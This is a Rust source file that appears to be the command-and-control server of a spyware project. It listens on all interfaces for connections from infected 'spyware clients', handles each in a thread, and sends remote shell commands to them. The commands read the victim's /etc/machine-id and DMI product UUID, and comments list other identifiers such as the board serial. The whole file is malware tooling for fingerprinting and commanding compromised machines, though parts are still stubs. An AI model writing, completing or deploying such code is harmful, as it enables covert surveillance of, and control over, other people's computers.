use std::net::{TcpListener, TcpStream};
use std::thread;
use std::io::Error;
use spyware_cli::commands::run_command;

pub const BIND_ANY: &str = "0.0.0.0";

fn get_unique_computer_identifier(stream: &mut TcpStream) -> Result<String, Error> {
    // Ways to get unique identifiers across reboots
    // On linux:
    /// cat /var/lib/dbus/machine-id == cat /etc/machine-id
    /// root - cat /sys/class/dmi/id/product_uuid
    /// root - cat /sys/class/dmi/id/board_serial
    // On freeBSD:
    /// sysctl kern.hostuuid
    // On Windows:
    ///
    let response = run_command("cat /etc/machine-id".to_string(), stream)?;
    println!("The machine id of connected spyware is {}", response.output);
    let response = run_command("cat /sys/class/dmi/id/product_uuid".to_string(), stream)?;
    println!("The machine id of connected spyware is {}", response.output);
    Ok(response.output)
}

pub fn handle_connected_spyware_client(mut stream: TcpStream) {
    println!("Wow, someone connected! Let's drop the stream.");
    // The spyware does not give orders to us, the only functionality is we send commands and get responses.
    let identifier = get_unique_computer_identifier(&mut stream);
}

pub fn run_server(port: u16) {
    // If this function fails, it should and will panic.
    let listener = TcpListener::bind(format!("{}:{}", BIND_ANY, port)).expect("Could not bind to port");

    match listener.local_addr() {
        Ok(address) => {
            println!("Listening for connections on: {:?}", address);
        }
        Err(e) => {
            println!("Error {} while trying to get local address.", &e);
        }
    };

    // accept connections and process them in a new thread
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection from: {}", stream.peer_addr().expect("Could not get remote address"));
                thread::spawn(move || {
                    // connection succeeded
                    handle_connected_spyware_client(stream)
                });
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    };
    panic!("Server closed unexpectedly")
}